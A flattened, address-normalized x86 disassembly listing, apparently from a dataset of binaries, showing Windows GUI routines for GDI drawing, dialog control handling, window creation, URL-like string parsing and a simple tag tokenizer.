mov ecx edi
mov edx [ ecx ]
mov [ esp + 0x74 ] eax
mov eax [ ecx + 0x4 ]
mov [ esp + 0x60 ] edx
mov edx [ ecx + 0x8 ]
mov [ esp + 0x64 ] eax
mov eax [ ecx + 0xc ]
lea ecx [ esp + 0x50 ]
push ecx
push 0x0
mov [ esp + 0x70 ] edx
mov edx [ rw-data ]
push 0x406
push edx
mov [ esp + 0x6c ] esi
mov [ esp + 0x7c ] eax
call ebx
inc esi
add edi 0x10
cmp esi 0x5
jl r-xdata
jmp r-xdata
mov eax [ rw-data ]
shl eax 0x4
lea edx [ eax + rw-data ]
mov eax [ edx ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0x30 ] eax
mov eax [ edx + 0x8 ]
mov [ esp + 0x34 ] ecx
mov ecx [ edx + 0xc ]
push 0x0
lea edx [ esp + 0x34 ]
inc eax
push edx
inc ecx
push ebp
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] ecx
mov [ rw-data ] 0x0
call ebx
call [ ReleaseCapture@IAT ]
cmp edi 0x1
jne r-xdata
push edi
call sub_42dd20
add esp 0x4
test eax eax
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
call [ ReleaseCapture@IAT ]
jmp r-xdata
cmp edx [ ecx + rw-data ]
jg r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push esi
call [ SelectObject@IAT ]
mov eax [ rw-data ]
xor edi edi
cmp eax 0x5
jne r-xdata
mov eax [ rw-data ]
push 0xcc0020
push 0x0
push 0x1c
push ebp
push 0xc
push 0xe
push 0x1
inc eax
push eax
push esi
call edi
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov eax [ esp + 0x1c ]
push eax
jmp r-xdata
push esi
call [ SelectObject@IAT ]
mov edi [ esp + 0x18 ]
shl edi 0x4
mov eax [ edi + rw-data ]
mov ecx [ edi + rw-data ]
push 0x0
push eax
push ecx
push esi
call [ MoveToEx@IAT ]
mov edx [ edi + rw-data ]
mov eax [ edi + rw-data ]
push edx
push eax
push esi
call ebx
mov ecx [ edi + rw-data ]
mov edx [ edi + rw-data ]
push ecx
push edx
push esi
call ebx
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp edi 0x2
jne r-xdata
lea ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] rw-data
mov ecx rw-data
jmp r-xdata
mov eax [ eax + 0xc ]
cmp [ eax ] di
je r-xdata
mov edx [ rw-data ]
lea ecx [ esi + 0x1 ]
cmp edx ecx
jne r-xdata
mov edx [ esp + 0x28 ]
push 0x0
push 0x4
lea eax [ edi + edx - 0x6 ]
push eax
push esi
call [ MoveToEx@IAT ]
mov ecx [ esp + 0x28 ]
push 0xb
lea edx [ edi + ecx - 0xd ]
push edx
push esi
call ebx
mov eax [ esp + 0x28 ]
push 0x0
push 0xa
lea ecx [ edi + eax - 0x6 ]
push ecx
push esi
call [ MoveToEx@IAT ]
mov edx [ esp + 0x28 ]
push 0x3
lea eax [ edi + edx - 0xd ]
push eax
push esi
call ebx
mov edi [ BitBlt@IAT ]
cmp [ rw-data ] 0x5
jne r-xdata
push esi
call [ SelectObject@IAT ]
mov edx [ edi + rw-data ]
mov eax [ edi + rw-data ]
push edx
push eax
push esi
call ebx
mov ecx [ edi + rw-data ]
mov edx [ edi + rw-data ]
push ecx
push edx
push esi
call ebx
mov eax [ esp + 0x40 ]
mov edi [ BitBlt@IAT ]
mov eax [ rw-data ]
lea esi [ edi + 0x1 ]
cmp eax esi
je r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
inc eax
mov [ esp + 0x40 ] eax
mov eax [ rw-data ]
lea ecx [ esp + 0x48 ]
add eax esi
push ecx
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] rw-data
lea ecx [ esp + 0x44 ]
call sub_42e0f0
test al al
jne r-xdata
jmp r-xdata
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov [ esp + 0x34 ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x30 ] edx
push edi
lea edx [ esp + 0x34 ]
inc ecx
push edx
inc eax
push ebp
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] eax
call ebx
push ebp
call [ UpdateWindow@IAT ]
cmp esi edi
je r-xdata
mov edi 0x1
mov esi [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x13 ] 0x1
push ebp
call [ SetCapture@IAT ]
push 0x0
push 0x0
push ebp
mov [ rw-data ] esi
call ebx
push ebp
call [ UpdateWindow@IAT ]
call sub_42e330
jmp r-xdata
cmp esi 0x1
je r-xdata
call sub_42e4d0
jmp r-xdata
cmp esi 0x2
je r-xdata
call sub_42e560
jmp r-xdata
cmp esi 0x3
je r-xdata
call sub_42e150
cmp esi 0x4
jne r-xdata
mov eax [ rw-data ]
push edi
push 0xaf
push 0x111
push eax
call [ SendMessageA@IAT ]
sub_452350
mov eax [ rw-data ]
sub esp 0x80
push esi
xor esi esi
cmp eax esi
je r-xdata
xor eax eax
pop esi
add esp 0x80
retn
mov ecx [ rw-data ]
cmp ecx esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
mov edx [ rw-data ]
mov [ esp + 0x3c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x68 ] eax
mov eax [ rw-data ]
mov [ esp + 0x5c ] ecx
lea ecx [ esp + 0x4 ]
mov [ esp + 0x60 ] edx
mov [ esp + 0x58 ] eax
mov eax [ rw-data ]
push ecx
lea edx [ esp + 0x40 ]
push edx
mov [ esp + 0x88 ] esi
mov [ esp + 0x74 ] esi
mov [ esp + 0x78 ] esi
mov [ esp + 0x7c ] esi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] 0x5000002f
mov [ esp + 0x5c ] esi
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] esi
mov [ esp + 0x54 ] esi
mov [ esp + 0x6c ] eax
mov [ esp + 0x58 ] 0x50000149
call sub_42e740
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ rw-data ]
push edi
push eax
push ecx
call sub_451510
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
push edx
push eax
call sub_451510
mov eax [ rw-data ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov edi [ GetWindowLongA@IAT ]
add esp 0x10
push 0xfffffffa
push eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
call edi
push 0x7f00
push esi
mov [ esp + 0x2c ] eax
mov [ esp + 0x40 ] r--data
mov [ esp + 0x1c ] 0x3
mov [ esp + 0x18 ] 0x30
mov [ esp + 0x30 ] esi
mov [ esp + 0x44 ] esi
call [ LoadCursorA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x30 ] eax
mov [ esp + 0x38 ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x34 ] esi
mov [ esp + 0x1c ] sub_451b10
call [ RegisterClassExA@IAT ]
test ax ax
jne r-xdata
mov edx [ rw-data ]
push esi
push 0xfffffffa
push edx
call edi
push eax
mov eax [ rw-data ]
push esi
push eax
push esi
push esi
push esi
push esi
push 0x50000000
push esi
push r--data
push esi
call [ CreateWindowExA@IAT ]
pop edi
mov [ rw-data ] eax
mov eax 0x1
pop esi
add esp 0x80
retn
pop edi
xor eax eax
pop esi
add esp 0x80
retn
sub_452520
push ebp
mov ebp [ esp + 0x8 ]
test ebp ebp
push esi
mov esi eax
je r-xdata
pop esi
pop ebp
retn
test edi edi
je r-xdata
mov [ edi ] 0x0
mov al [ esi ]
or ecx 0xffffffff
test al al
je r-xdata
lea esp [ esp ]
mov al [ esi ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
jbe r-xdata
lea edx [ ebp - 0x1 ]
cmp ecx edx
jge r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
mov [ ecx + edi ] al
inc ecx
test ecx ecx
jl r-xdata
jmp r-xdata
cmp al 0x3f
je r-xdata
xor ecx ecx
jmp r-xdata
test ecx ecx
test ecx ecx
jle r-xdata
mov [ ecx + edi ] 0x0
jl r-xdata
dec ecx
sub_452590
mov al [ esi ]
sub esp 0x208
push edi
xor edi edi
test al al
je r-xdata
cmp edi 0x7
mov [ edi + esi ] 0x0
mov [ esp + 0xb ] 0x0
jl r-xdata
lea edx [ esp + 0x4 ]
mov eax esi
sub edx esi
cmp edi 0x1f9
jge r-xdata
push r--data
lea eax [ esp + 0x8 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
cmp cl 0xd
je r-xdata
mov cl [ esi + 0x7 ]
xor edx edx
xor edi edi
test cl cl
mov eax 0x7
je r-xdata
inc edi
push edi
push esi
lea ecx [ esp + 0x14 ]
push ecx
call [ lstrcpynA@IAT ]
mov edi [ lstrcpyA@IAT ]
push r--data
push esi
call edi
lea edx [ esp + 0xc ]
push edx
lea eax [ esi + 0x7 ]
push eax
call edi
cmp edi 0x7
jge r-xdata
lea ecx [ eax - 0x1 ]
cmp edx ecx
jge r-xdata
mov cl [ eax + esi ]
cmp cl 0x2f
jne r-xdata
mov cl [ eax + 0x1 ]
inc edi
inc eax
test cl cl
jne r-xdata
mov [ edx + eax ] cl
pop edi
add esp 0x208
retn
cmp edi edx
jg r-xdata
cmp cl 0x2e
jne r-xdata
mov edx eax
mov cl [ eax ]
cmp cl 0xa
je r-xdata
mov [ eax + esi ] 0x2f
mov [ eax + esi + 0x1 ] 0x0
mov cl [ eax + esi + 0x1 ]
inc eax
test cl cl
jne r-xdata
test edx edx
jle r-xdata
mov edi eax
sub_452660
mov al [ ebx ]
sub esp 0x8
push ebp
push esi
push edi
xor edi edi
xor esi esi
test al al
je r-xdata
mov eax [ esp + 0x18 ]
push r--data
push eax
call [ lstrcpyA@IAT ]
pop edi
pop esi
pop ebp
add esp 0x8
retn
mov edx 0x1
mov ecx ebx
sub edx ebx
lea esp [ esp ]
cmp al 0x3f
je r-xdata
lea edi [ edx + ecx ]
jmp r-xdata
cmp edi 0x7
mov ebp [ lstrcpynA@IAT ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc esi
inc ecx
test al al
jne r-xdata
cmp edi esi
je r-xdata
push 0x8
push ebx
lea eax [ esp + 0x14 ]
push eax
call ebp
push r--data
lea ecx [ esp + 0x10 ]
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
cmp al 0x2f
jne r-xdata
test edi edi
je r-xdata
xor edi edi
sub esi edi
inc esi
cmp esi 0x100
jle r-xdata
mov edx [ esp + 0x18 ]
push esi
add edi ebx
push edi
push edx
call ebp
pop edi
pop esi
pop ebp
add esp 0x8
retn
mov esi 0x100
sub_452710
movzx eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
movzx edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
shr ecx 0x10
push ecx
mov ecx [ esp + 0xc ]
push edx
movzx edx [ esp + 0x10 ]
shr eax 0x10
push eax
mov eax [ esp + 0x24 ]
shr ecx 0x10
push ecx
push edx
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x20
retn
sub_452750
mov eax [ esp + 0x8 ]
sub esp 0x248
sub eax 0x110
push ebx
push ebp
push esi
push edi
je r-xdata
mov esi [ esp + 0x25c ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x1001e
push 0x0
push 0x465
push 0xd17
push esi
call edi
mov ecx [ rw-data ]
push ecx
push 0x0
push 0x467
push 0xd17
push esi
call edi
push 0x400
push 0x0
push 0x465
push 0xd19
push esi
call edi
mov edx [ rw-data ]
push edx
push 0x0
push 0x467
push 0xd19
push esi
call edi
push 0x10400
push 0x0
push 0x465
push 0xd1b
push esi
call edi
mov eax [ rw-data ]
cdq
and edx 0x3ff
add eax edx
sar eax 0xa
push eax
push 0x0
push 0x467
push 0xd1b
push esi
call edi
push 0x64
push 0x0
push 0x465
push 0xd1d
push esi
call edi
mov eax [ rw-data ]
push eax
push 0x0
push 0x467
push 0xd1d
push esi
call edi
mov al [ rw-data ]
test al al
je r-xdata
dec eax
jne r-xdata
lea ecx [ esp + 0x154 ]
push ecx
push 0x104
call [ GetTempPathA@IAT ]
push 0x104
lea edx [ esp + 0x54 ]
push edx
lea eax [ esp + 0x15c ]
push eax
call sub_457da0
add esp 0xc
push r--data
lea ecx [ esp + 0x54 ]
push ecx
call [ lstrcatA@IAT ]
lea edx [ esp + 0x50 ]
push edx
push rw-data
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x248
retn
movzx eax [ esp + 0x264 ]
cmp eax 0xd1f
jg r-xdata
cmp [ ebp + rw-data ] 0x3a
jne r-xdata
cmp ebp 0x20
jge r-xdata
push 0x0
push 0xc
push 0xd1e
push esi
call edi
mov eax [ rw-data ]
mov ebp [ CheckRadioButton@IAT ]
add eax 0xd20
push eax
push 0xd22
push 0xd20
push esi
call ebp
push rw-data
push 0x0
push 0xc
push 0xd24
push esi
call edi
mov ecx [ rw-data ]
mov ebx [ SendMessageA@IAT ]
add ecx 0xd20
push 0x0
movzx edx cx
push edx
push 0x111
push esi
call ebx
mov eax [ rw-data ]
add eax 0xd2a
push eax
push 0xd2b
push 0xd2a
push esi
call ebp
mov al [ rw-data ]
xor ebp ebp
test al al
je r-xdata
sub eax 0xd20
cmp eax 0x15
ja r-xdata
je r-xdata
mov ecx [ rw-data ]
add ecx 0xd2a
push 0x0
movzx edx cx
push edx
push 0x111
push esi
call ebx
mov eax [ rw-data ]
test eax eax
mov ebp [ CheckDlgButton@IAT ]
je r-xdata
push 0x20
lea ecx [ ebp + rw-data ]
push ecx
lea edx [ esp + 0x38 ]
push edx
call [ lstrcpynA@IAT ]
lea eax [ esp + 0x30 ]
push eax
push 0x0
push 0xc
push 0xd32
push esi
call edi
test ebp ebp
jle r-xdata
cmp [ ebp + rw-data ] 0x3a
je r-xdata
movzx eax [ eax + lookup_table_452e80 ]
jmp [ eax * 4 + jump_table_452e70 ]
push 0x104
lea eax [ esp + 0x158 ]
push eax
push 0x0
mov [ esp + 0x5c ] 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x154 ]
push ecx
call sub_457f40
mov esi [ esp + 0x260 ]
lea edx [ esp + 0x158 ]
push r--data
dec edx
mov [ eax + edx ] 0x0
push 0x104
lea eax [ esp + 0x5c ]
push eax
lea ecx [ esp + 0x164 ]
push ecx
push esi
call sub_45be60
mov al [ esp + 0x68 ]
add esp 0x18
test al al
je r-xdata
dec eax
je r-xdata
push rw-data
push 0x0
push 0xc
push 0xd36
push esi
call edi
push 0x0
push 0xd35
push 0x111
push esi
call ebx
push rw-data
push 0x0
push 0xc
push 0xd37
push esi
call edi
xor edi edi
lea ecx [ ecx ]
push 0x1
push 0xd35
push esi
call ebp
lea ecx [ ebp + 0x1 ]
push ecx
push rw-data
lea edx [ esp + 0x18 ]
push edx
call [ lstrcpynA@IAT ]
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0xc
push 0xd30
push esi
call edi
mov al [ ebp + rw-data ]
inc ebp
test al al
jne r-xdata
mov edi [ esp + 0x25c ]
push 0xd22
push edi
call [ IsDlgButtonChecked@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
push esi
push 0xd23
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push esi
push 0xd24
push edi
call ebx
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
mov edi [ esp + 0x25c ]
push 0xd2b
push edi
call [ IsDlgButtonChecked@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
push esi
push 0xd2f
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push esi
push 0xd30
push edi
call ebx
push eax
call ebp
push esi
push 0xd31
push edi
call ebx
push eax
call ebp
push esi
push 0xd32
push edi
call ebx
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
mov edi [ esp + 0x25c ]
push 0xd35
push edi
call [ IsDlgButtonChecked@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
push esi
push 0xd34
push edi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push esi
push 0xd36
push edi
call ebx
push eax
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
lea edx [ esp + 0x50 ]
push edx
push 0x0
push 0xc
push 0xd1e
push esi
call [ SendDlgItemMessageA@IAT ]
mov esi [ esp + 0x25c ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x468
push 0xd17
push esi
call edi
push 0x0
push 0x0
push 0x468
push 0xd19
push esi
mov [ rw-data ] eax
call edi
push 0x0
push 0x0
push 0x468
push 0xd1b
push esi
mov [ rw-data ] eax
call edi
push 0x0
push 0x0
push 0x468
push 0xd1d
shl eax 0xa
push esi
mov [ rw-data ] eax
call edi
push rw-data
push 0x104
push 0xd
push 0xd1e
push esi
mov [ rw-data ] eax
call edi
lea edx [ esp + 0x154 ]
push edx
push 0x104
call [ GetTempPathA@IAT ]
push 0x104
lea eax [ esp + 0x54 ]
push eax
lea ecx [ esp + 0x15c ]
push ecx
call sub_457da0
mov ebx [ lstrcatA@IAT ]
add esp 0xc
push r--data
lea edx [ esp + 0x54 ]
push edx
call ebx
push rw-data
lea eax [ esp + 0x54 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
dec eax
je r-xdata
inc edi
cmp edi 0x5
jl r-xdata
push 0x1
lea ecx [ edi + 0x4f3 ]
push ecx
push esi
call ebp
mov ebp [ IsDlgButtonChecked@IAT ]
push 0xd20
push esi
call ebp
test eax eax
je r-xdata
mov [ rw-data ] al
mov ecx [ esp + 0x25c ]
push 0x2
push ecx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
sub eax 0x4eb
jne r-xdata
mov ecx edi
mov eax 0x1
shl eax cl
test [ rw-data ] eax
je r-xdata
push 0xd21
push esi
call ebp
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov eax [ esp + 0x25c ]
push r--data
push 0x0
push 0xc
push 0xd37
push eax
call [ SendDlgItemMessageA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
push 0xd22
push esi
call ebp
test eax eax
je r-xdata
mov [ rw-data ] 0x1
push rw-data
push 0x104
push 0xd
push 0xd24
push esi
call edi
push 0xd2a
push esi
call ebp
test eax eax
je r-xdata
mov [ rw-data ] 0x2
push 0xd2b
push esi
call ebp
test eax eax
je r-xdata
mov [ rw-data ] 0x0
push rw-data
push 0x104
push 0xd
push 0xd24
push esi
call edi
lea ecx [ esp + 0x30 ]
push ecx
push 0x20
push 0xd
push 0xd30
push esi
call edi
lea edx [ esp + 0x10 ]
push edx
push 0x20
push 0xd
push 0xd32
push esi
call edi
lea eax [ esp + 0x30 ]
push eax
push rw-data
call [ lstrcpyA@IAT ]
push r--data
push rw-data
call ebx
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call ebx
push 0xd35
push esi
call ebp
push rw-data
push 0x100
neg eax
push 0xd
sbb eax eax
push 0xd36
neg eax
push esi
mov [ rw-data ] eax
call edi
push rw-data
push 0x50
push 0xd
push 0xd37
push esi
call edi
xor edi edi
mov [ rw-data ] edi
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov edx 0x1
shl edx cl
not edx
and eax edx
mov [ rw-data ] eax
mov eax 0x1
shl eax cl
or [ rw-data ] eax
jmp r-xdata
lea edx [ edi + 0x4f3 ]
push edx
push esi
call ebp
test eax eax
mov ecx edi
je r-xdata
push 0x1
push esi
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
inc edi
cmp edi 0x5
jl r-xdata
sub_452e84
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax [ rw-data ]
sub esp 0x428
push ebx
push esi
push edi
mov edi [ esp + 0x440 ]
push 0xce6
push eax
xor esi esi
and edi 0xfffeffff
call [ GetDlgItem@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
test [ esp + 0x440 ] 0x10000
je r-xdata
mov eax [ esp + 0x438 ]
mov esi [ SendMessageA@IAT ]
lea ecx [ esp + 0x234 ]
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x24 ] ecx
mov ecx [ eax + 0xfc ]
push ecx
push 0x102d
push ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x34 ] 0x200
call esi
mov ecx [ esp + 0x43c ]
lea edx [ esp + 0x34 ]
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x24 ] edx
mov edx [ ecx + 0xfc ]
push edx
push 0x102d
push ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x34 ] 0x200
call esi
push 0xffffffff
lea eax [ esp + 0x38 ]
push eax
push 0xffffffff
lea ecx [ esp + 0x240 ]
push ecx
push 0x1
push 0x800
call [ CompareStringA@IAT ]
mov esi eax
dec esi
neg esi
sbb esi esi
and esi 0x2
dec esi
pop edi
mov eax esi
pop esi
pop ebx
add esp 0x428
retn 0xc
neg esi
sub_452f80
mov eax [ rw-data ]
sub esp 0x18
test eax eax
je r-xdata
xor eax eax
add esp 0x18
retn
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ GetWindowRect@IAT ]
lea edx [ esp ]
push edx
call [ GetCursorPos@IAT ]
mov eax [ esp ]
cmp [ esp + 0x8 ] eax
jg r-xdata
cmp eax [ esp + 0x10 ]
jge r-xdata
mov eax [ esp + 0x4 ]
cmp [ esp + 0xc ] eax
jg r-xdata
cmp eax [ esp + 0x14 ]
jge r-xdata
mov eax [ esp + 0x1c ]
mov edx [ rw-data ]
push eax
lea ecx [ esp + 0x4 ]
push ecx
push 0x1401
push edx
call [ SendMessageA@IAT ]
mov eax 0x1
add esp 0x18
retn
sub_452ff0
mov eax [ rw-data ]
test eax eax
je r-xdata
jmp sub_4af340
push esi
mov esi [ GetDlgItem@IAT ]
push edi
push 0x0
push 0x0
push 0x1009
push 0xce6
push eax
call esi
mov edi [ SendMessageA@IAT ]
push eax
call edi
mov eax [ rw-data ]
push 0x0
push 0xcea
push eax
call esi
push eax
call [ EnableWindow@IAT ]
mov ecx [ rw-data ]
push 0x0
push 0x3000ce5
push 0x111
push ecx
call edi
pop edi
pop esi
sub_453050
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
push esi
add ecx 0x4
add eax 0x4
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
test eax eax
je r-xdata
pop esi
sub_453080
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0xf0 ]
mov ebp 0x10
cmp eax ebp
push edi
jb r-xdata
xor ebx ebx
mov edi 0xf
mov [ esi + 0xf0 ] edi
mov [ esi + 0xec ] ebx
mov [ esi + 0xdc ] bl
cmp [ esi + 0xd0 ] ebp
jb r-xdata
mov eax [ esi + 0xdc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0xd0 ] edi
mov [ esi + 0xcc ] ebx
mov [ esi + 0xbc ] bl
cmp [ esi + 0x80 ] ebp
jb r-xdata
mov eax [ esi + 0xbc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x80 ] edi
mov [ esi + 0x7c ] ebx
mov [ esi + 0x6c ] bl
cmp [ esi + 0x20 ] ebp
jb r-xdata
mov eax [ esi + 0x6c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x20 ] edi
mov [ esi + 0x1c ] ebx
pop edi
mov [ esi + 0xc ] bl
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_453130
push ebx
mov ebx [ esp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
push ebp
push edi
jne r-xdata
mov ecx [ ebx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov ebp edx
xor ebp ebp
jmp r-xdata
pop edi
pop ebp
pop ebx
retn
push esi
xor esi esi
xor edi edi
test ebp ebp
jle r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
inc edi
add esi 0x70
cmp edi ebp
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
push edi
push 0x2
push 0x0
push eax
push ecx
call sub_4b1c90
add esp 0x14
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + esi + 0x18 ]
add eax esi
cmp ecx 0x10
jb r-xdata
pop esi
mov eax [ ebx + 0x4 ]
mov edx [ eax + esi + 0x18 ]
add eax esi
cmp edx 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
push 0x20000
push 0x1410
push ecx
call [ SendMessageA@IAT ]
sub_4531e0
push 0xffffffff
push sub_4c07f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_453260
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
inc ecx
mov [ esi ] ecx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ esi ]
mov al [ ecx ]
cmp al 0x20
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
jne r-xdata
mov edi [ esp + 0x18 ]
mov eax [ edi + 0x18 ]
mov ebx 0x10
push ecx
cmp eax ebx
mov edx esp
lea eax [ edi + 0x4 ]
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ ecx ] eax
lea eax [ esp + 0x1c ]
push eax
mov ecx edi
call sub_401c60
mov eax [ esi ]
mov bl [ eax ]
test bl bl
jne r-xdata
mov eax [ eax ]
mov ebp [ edi + 0x14 ]
add ebp ecx
mov [ edx ] ebp
cmp [ edi + 0x18 ] ebx
push ecx
mov ecx esp
jb r-xdata
cmp bl 0x3c
jne r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
cmp bl 0x3e
jne r-xdata
inc eax
mov [ esi ] eax
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp bl 0x3d
jne r-xdata
inc eax
mov [ esi ] eax
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401e80
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp bl 0x22
je r-xdata
inc eax
push r--data
mov ecx edi
mov [ esi ] eax
call sub_402510
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401e80
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
inc eax
mov [ esi ] eax
cmp [ eax ] bl
je r-xdata
cmp bl 0x27
je r-xdata
inc eax
mov [ esi ] eax
xor ecx ecx
mov cl [ eax ]
test cl cl
je r-xdata
mov ecx [ esi ]
mov al [ ecx ]
cmp al 0x20
je r-xdata
cmp [ eax ] bl
jne r-xdata
push ecx
push 0x1
mov ecx edi
call sub_4017f0
mov ebp [ esi ]
inc ebp
mov ecx ebp
mov [ esi ] ebp
cmp [ ecx ] bl
mov eax ebp
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp al 0x9
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0x3e
je r-xdata
test al al
je r-xdata
push eax
push 0x1
mov ecx edi
call sub_4017f0
mov ecx [ esi ]
inc ecx
mov edx ecx
mov [ esi ] ecx
cmp [ edx ] 0x3d
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4533c0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x3fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 4 ]
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
